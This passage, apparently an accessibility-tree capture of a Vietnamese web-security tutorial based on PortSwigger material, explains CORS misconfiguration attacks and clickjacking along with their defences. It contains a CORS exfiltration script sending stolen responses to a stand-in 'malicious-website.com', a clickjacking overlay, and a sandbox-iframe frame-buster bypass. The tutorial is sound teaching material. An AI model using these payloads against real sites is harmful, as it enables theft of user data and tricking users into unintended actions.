          - generic [ref=e3471]: req.onload = reqListener;
          - generic [ref=e3473]: req.open('get','vulnerable-website.com/sensitive-victim-data',true);
          - generic [ref=e3475]: req.withCredentials = true;
          - generic [ref=e3477]: req.send();
          - generic [ref=e3479]: "function reqListener() { location='malicious-website.com/log?key='+this.responseText; };"
          - generic [ref=e3481]: </script>"></iframe>
        - button [ref=e3483] [cursor=pointer]
      - paragraph [ref=e3487]:
        - strong [ref=e3488]: d) Khai thác XSS qua quan hệ tin cậy CORS.
        - text: Nếu site tin một origin (ví dụ
        - code [ref=e3489]: subdomain.vulnerable-website.com
        - text: ) mà origin đó có XSS, attacker dùng XSS để chạy CORS request lấy dữ liệu nhạy cảm (ví dụ API key).
      - paragraph [ref=e3490]:
        - strong [ref=e3491]: e) Phá TLS với CORS cấu hình kém.
        - text: Site HTTPS nhưng whitelist một subdomain HTTP. Attacker ở vị trí man-in-the-middle chặn request HTTP, redirect nạn nhân tới subdomain HTTP đó, trả về response giả chứa CORS request tới site HTTPS. Vì subdomain nằm trong whitelist nên dữ liệu được trả về. Hiệu quả kể cả khi site dùng HTTPS chặt và cookie đều
        - code [ref=e3492]: secure
        - text: .
      - paragraph [ref=e3493]:
        - strong [ref=e3494]: f) Intranet và CORS không cần credential.
        - text: Với
        - code [ref=e3495]: "ACAO: *"
        - text: (không credential), attacker vẫn tấn công được các site nội bộ (IP private) bằng cách dùng trình duyệt của nạn nhân làm proxy.
      - heading "Phòng chống" [level=4] [ref=e3496]
      - list [ref=e3497]:
        - listitem [ref=e3498]: Chỉ định đúng origin trong ACAO cho tài nguyên nhạy cảm.
        - listitem [ref=e3499]:
          - text: Chỉ cho phép
          - strong [ref=e3500]: site tin cậy
          - text: ", không phản chiếu origin mà không validate."
        - listitem [ref=e3501]:
          - text: Tránh whitelist
          - code [ref=e3502]: "null"
          - text: .
        - listitem [ref=e3503]: Tránh wildcard trong mạng nội bộ.
        - listitem [ref=e3504]:
          - text: CORS
          - strong [ref=e3505]: không thay thế
          - text: "bảo mật phía server: vẫn phải có authentication và session management, vì attacker có thể giả mạo request từ origin tin cậy bất kỳ."
      - separator [ref=e3506]
      - heading "Clickjacking (UI redressing)" [level=3] [ref=e3507]
      - paragraph [ref=e3508]:
        - img "Clickjacking" [ref=e3509]
        - emphasis [ref=e3510]:
          - text: "Nguồn:"
          - link "PortSwigger Web Security Academy" [ref=e3511] [cursor=pointer]:
            - /url: https://portswigger.net/web-security/clickjacking
      - heading "Khái niệm" [level=4] [ref=e3512]
      - paragraph [ref=e3513]:
        - text: Clickjacking lừa user
        - strong [ref=e3514]: click vào nội dung ẩn
        - text: của một website khác trong khi tưởng đang click vào trang mồi (decoy). Website mục tiêu được nhúng dưới dạng iframe trong suốt, đặt chồng lên trang mồi.
      - paragraph [ref=e3515]:
        - strong [ref=e3516]: "Khác với CSRF:"
        - text: clickjacking cần user
        - strong [ref=e3517]: thực hiện hành động
        - text: (click), còn CSRF giả mạo nguyên một request mà không cần user tương tác.
        - strong [ref=e3518]: CSRF token không chống được clickjacking
        - text: ", vì session được thiết lập với nội dung thật và mọi request diễn ra on-domain, chỉ khác là trong iframe ẩn."
      - heading "Dựng tấn công cơ bản" [level=4] [ref=e3519]
      - paragraph [ref=e3520]:
        - text: "Dùng CSS tạo lớp: iframe mục tiêu (gần như trong suốt,"
        - code [ref=e3521]: z-index
        - text: "cao hơn) chồng lên trang mồi, canh để nút cần click trùng với nút mồi:"
      - generic [ref=e3523]:
        - code [ref=e3525]:
          - generic [ref=e3526]: <style>
          - generic [ref=e3528]: "#target_website { position:relative; width:128px; height:128px; opacity:0.00001; z-index:2; }"
          - generic [ref=e3530]: "#decoy_website { position:absolute; width:300px; height:400px; z-index:1; }"
          - generic [ref=e3532]: </style>
          - generic [ref=e3534]: <div id="decoy_website"> ...decoy web content here... </div>
          - generic [ref=e3536]: <iframe id="target_website" src="https://vulnerable-website.com"></iframe>
        - button [ref=e3538] [cursor=pointer]
      - list [ref=e3542]:
        - listitem [ref=e3543]:
          - code [ref=e3544]: opacity
          - text: gần 0 để iframe trong suốt. Một số trình duyệt (Chrome 76) phát hiện iframe quá trong suốt, nên attacker chọn giá trị vừa đủ.
        - listitem [ref=e3545]:
          - text: Burp
          - strong [ref=e3546]: Clickbandit
          - text: tạo PoC nhanh không cần viết HTML/CSS.
      - paragraph [ref=e3547]:
        - strong [ref=e3548]: "Các biến thể:"
      - list [ref=e3549]:
        - listitem [ref=e3550]:
          - strong [ref=e3551]: "Prefilled form:"
          - text: nếu form cho điền sẵn qua tham số GET, attacker sửa URL target để chèn giá trị của mình rồi overlay nút submit.
        - listitem [ref=e3552]:
          - strong [ref=e3553]: "Kết hợp DOM XSS:"
          - text: ghép exploit XSS vào URL của iframe, user click thì DOM XSS chạy.
        - listitem [ref=e3554]:
          - strong [ref=e3555]: "Multistep:"
          - text: dùng nhiều div/iframe cho các hành động cần nhiều bước (ví dụ thêm hàng vào giỏ rồi đặt đơn).
      - heading "Phòng chống" [level=4] [ref=e3556]
      - paragraph [ref=e3557]:
        - strong [ref=e3558]: "Client-side (frame busting script):"
        - text: JavaScript kiểm tra trang có phải top window không, hiện mọi frame, chặn click vào frame ẩn. Dễ bị bypass, ví dụ bằng iframe
        - code [ref=e3559]: sandbox
        - text: ":"
      - generic [ref=e3561]:
        - code [ref=e3563]:
          - generic [ref=e3564]: <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
        - button [ref=e3566] [cursor=pointer]
      - paragraph [ref=e3570]:
        - text: Với
        - code [ref=e3571]: allow-forms
        - text: /
        - code [ref=e3572]: allow-scripts
        - text: nhưng thiếu
        - code [ref=e3573]: allow-top-navigation
        - text: ", frame buster không kiểm tra được mình có phải top window."
      - paragraph [ref=e3574]:
        - strong [ref=e3575]: "Server-side (khuyến nghị):"
      - list [ref=e3576]:
        - listitem [ref=e3577]:
          - strong [ref=e3578]: "X-Frame-Options:"
          - code [ref=e3579]: deny
